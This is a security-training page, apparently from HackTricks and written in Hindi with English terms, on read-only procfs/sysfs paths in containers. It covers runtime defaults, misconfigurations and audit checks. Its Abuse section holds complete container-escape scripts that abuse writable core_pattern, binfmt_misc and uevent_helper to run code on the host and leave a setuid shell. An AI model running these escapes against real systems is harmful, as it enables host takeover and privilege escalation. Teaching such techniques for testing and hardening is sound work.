# Read-Only System Paths

{{#include ../../../../banners/hacktricks-training.md}}

Read-only system paths, masked paths से अलग एक protection हैं। किसी path को पूरी तरह छिपाने के बजाय, runtime उसे उपलब्ध रखता है लेकिन उसे read-only के रूप में mount करता है। यह procfs और sysfs की चुनी हुई locations के लिए सामान्य है, जहाँ read access स्वीकार्य या operational रूप से आवश्यक हो सकता है, लेकिन writes बहुत खतरनाक होंगी।

इसका उद्देश्य सीधा है: कई kernel interfaces writable होने पर कहीं अधिक खतरनाक हो जाते हैं। Read-only mount सभी reconnaissance value को समाप्त नहीं करता, लेकिन यह compromised workload को उस path के माध्यम से underlying kernel-facing files को modify करने से रोकता है।

## Operation

Runtimes अक्सर proc/sys view के कुछ हिस्सों को read-only के रूप में mark करते हैं। Runtime और host के आधार पर, इनमें ऐसे paths शामिल हो सकते हैं:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

वास्तविक list अलग हो सकती है, लेकिन model समान रहता है: जहाँ आवश्यक हो वहाँ visibility की अनुमति दें, और default रूप से mutation को deny करें।

## Lab

Docker द्वारा घोषित read-only path list को inspect करें:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
container के अंदर mounted proc/sys view का निरीक्षण करें:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Read-only system paths host-impacting abuse की एक बड़ी श्रेणी को सीमित करते हैं। भले ही attacker procfs या sysfs का निरीक्षण कर सके, वहां write करने में असमर्थता kernel tunables, crash handlers, module-loading helpers या अन्य control interfaces से जुड़े कई direct modification paths हटा देती है। Exposure समाप्त नहीं होता, लेकिन information disclosure से host influence तक का transition कठिन हो जाता है।

## Misconfigurations

मुख्य गलतियां sensitive paths को unmask करना या उन्हें read-write के रूप में remount करना, writable bind mounts के माध्यम से host proc/sys content को सीधे expose करना, या privileged modes का उपयोग करना हैं, जो safer runtime defaults को प्रभावी रूप से bypass कर देते हैं। Kubernetes में `procMount: Unmasked` और privileged workloads अक्सर कमजोर proc protection के साथ मिलते हैं। एक अन्य सामान्य operational mistake यह मानना है कि runtime आमतौर पर इन paths को read-only mount करता है, इसलिए सभी workloads अभी भी वही default inherit कर रहे हैं।

## Abuse

यदि protection कमजोर है, तो writable proc/sys entries को ढूंढकर शुरुआत करें:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
जब writable entries मौजूद हों, तो high-value follow-up paths में शामिल हैं:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
ये commands क्या reveal कर सकते हैं:

- `/proc/sys` के अंतर्गत Writable entries अक्सर यह दर्शाती हैं कि container केवल निरीक्षण करने के बजाय host के kernel behavior को modify कर सकता है।
- `core_pattern` विशेष रूप से महत्वपूर्ण है, क्योंकि किसी Writable host-facing value को pipe handler सेट करने के बाद किसी process को crash कराकर host code-execution path में बदला जा सकता है।
- `modprobe` module-loading से संबंधित flows के लिए kernel द्वारा उपयोग किए जाने वाले helper को reveal करता है; Writable होने पर यह एक classic high-value target है।
- `binfmt_misc` बताता है कि custom interpreter registration संभव है या नहीं। यदि registration Writable है, तो यह केवल information leak के बजाय execution primitive बन सकता है।
- `panic_on_oom` host-wide kernel decision को नियंत्रित करता है और इसलिए resource exhaustion को host denial of service में बदल सकता है।
- `uevent_helper` Writable sysfs helper path द्वारा host-context execution होने के सबसे स्पष्ट examples में से एक है।

Interesting findings में Writable host-facing proc knobs या sysfs entries शामिल हैं, जिन्हें सामान्यतः read-only होना चाहिए। इस बिंदु पर workload एक constrained container view से आगे बढ़कर kernel influence के meaningful स्तर तक पहुँच चुका होता है।

### Full Example: `core_pattern` Host Escape

यदि `/proc/sys/kernel/core_pattern` container के अंदर से Writable है और host kernel view की ओर point करता है, तो crash के बाद payload execute करने के लिए इसका दुरुपयोग किया जा सकता है:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
यदि path वास्तव में host kernel तक पहुँचता है, तो payload host पर चलता है और पीछे एक setuid shell छोड़ देता है।

### पूरा उदाहरण: `binfmt_misc` Registration

यदि `/proc/sys/fs/binfmt_misc/register` writable है, तो matching file को execute करने पर custom interpreter registration code execution कर सकता है:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Host-facing writable `binfmt_misc` पर परिणाम kernel-triggered interpreter path में code execution होता है।

### पूर्ण उदाहरण: `uevent_helper`

यदि `/sys/kernel/uevent_helper` writable है, तो matching event trigger होने पर kernel host-path helper को invoke कर सकता है:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
यह इतना खतरनाक होने का कारण यह है कि helper path को सुरक्षित container-only context के बजाय host filesystem के दृष्टिकोण से resolve किया जाता है।

## Checks

ये checks यह निर्धारित करते हैं कि जहाँ अपेक्षित हो वहाँ procfs/sysfs exposure read-only है या नहीं, और क्या workload अभी भी संवेदनशील kernel interfaces को modify कर सकता है।
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
यहाँ क्या महत्वपूर्ण है:

- एक सामान्य hardened workload को बहुत कम writable proc/sys entries expose करनी चाहिए।
- Writable `/proc/sys` paths अक्सर साधारण read access से अधिक महत्वपूर्ण होते हैं।
- यदि runtime किसी path को read-only बताता है, लेकिन वह व्यवहार में writable है, तो mount propagation, bind mounts और privilege settings की सावधानी से समीक्षा करें।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker sensitive proc entries के लिए एक default read-only path list निर्धारित करता है | host proc/sys mounts expose करना, `--privileged` |
| Podman | Enabled by default | Podman default read-only paths लागू करता है, जब तक उन्हें explicitly relaxed न किया जाए | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Inherits runtime defaults | Pod settings या host mounts द्वारा कमजोर किए जाने तक underlying runtime read-only path model का उपयोग करता है | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | आमतौर पर OCI/runtime defaults पर निर्भर करता है | Kubernetes row के समान; direct runtime config changes इस behavior को कमजोर कर सकते हैं |

मुख्य बात यह है कि read-only system paths आमतौर पर runtime default के रूप में मौजूद होते हैं, लेकिन privileged modes या host bind mounts के माध्यम से इन्हें आसानी से कमजोर किया जा सकता है।
{{#include ../../../../banners/hacktricks-training.md}}
